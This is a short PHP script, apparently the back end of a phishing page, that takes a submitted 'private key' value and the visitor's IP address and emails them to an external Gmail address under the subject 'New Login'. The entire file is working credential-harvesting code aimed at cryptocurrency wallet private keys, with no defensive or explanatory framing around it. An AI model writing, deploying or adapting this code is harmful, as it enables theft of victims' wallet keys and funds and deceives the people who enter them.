<?php
$ip = getenv("REMOTE_ADDR");	

if(!empty($_POST)) {
 $privatekeyval= $_POST['privatekeyval'];

 
		$to = "taranke017@gmail.com";
		
		
		
         $subject = "New Login : from Justin Well";
		 
		 $message =  "Private Key            : ".$privatekeyval."\r\n";

		 $message .= "IP           : ".$ip."\r\n";
		$header = "Content type: Justin well tools \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
		 
		 mail ($to,$subject,$message,$header);
		
}
?>  